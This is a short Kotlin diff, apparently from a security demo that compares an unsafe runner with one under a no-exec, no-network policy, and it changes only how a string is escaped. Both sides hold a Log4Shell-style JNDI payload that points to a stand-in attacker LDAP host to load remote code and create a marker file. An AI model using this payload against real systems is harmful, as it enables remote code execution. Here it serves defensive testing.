@@ -41,7 +41,7 @@ fun runUnsafe() {
     println("Expected Behavior: Log the string.")
     println("Actual Behavior:   Exploit triggers unauthorized \u001b[1mexecve()\u001b[0m.")
 
-    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_unsafe}"
+    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_unsafe}"
     UnsafeRunner.run(payload)
 
     if (marker.exists()) {
@@ -71,7 +71,7 @@ fun runSafe() {
     println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
     println("Context:  Malicious JNDI payload received.")
 
-    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
+    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
 
     try {
         println("Action:   Attempting unauthorized execve()...")
